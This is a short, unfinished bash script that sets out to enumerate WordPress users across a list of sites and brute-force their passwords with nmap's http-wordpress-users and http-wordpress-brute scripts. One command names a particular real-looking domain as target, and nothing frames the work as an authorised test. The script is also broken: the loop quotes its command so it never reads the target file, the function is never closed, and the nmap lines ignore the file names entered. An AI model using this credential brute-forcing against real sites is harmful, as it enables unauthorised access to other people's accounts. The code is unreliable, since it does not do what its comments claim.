# scrip to run through a list of wp sites, identify users and brute force the users against a word list.

# Run the users script - takes the first site listed in the targets.txt file  and run the users script to create a list of users saved in users.txt file.
# These users need to be saved in unique files associated with the web site name

# users the second script and uses the unique users.txt file and passwords.txt as inputs.

menue() {
echo
echo "1 Enter word list file name"
read -p $'Enter target list file name:' targets
targets="${targets}"
read -p $'Enter password list file name:' passwords
passwords="${passwords}"

count_pass_t=$(wc -l $targets)
count_pass_p=$(wc -l $passwords)

for fn in 'cat $targets'; do


nmap -sV --script http-wordpress-users --script-args http-wordpress-users.limit=10,http-wordpress-users.out=z_users.txt target_list.txt

nmap -sV --script http-wordpress-brute --script-args 'userdb=z_users.txt,passdb=zz_passwords,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' ecosymbiosis.com
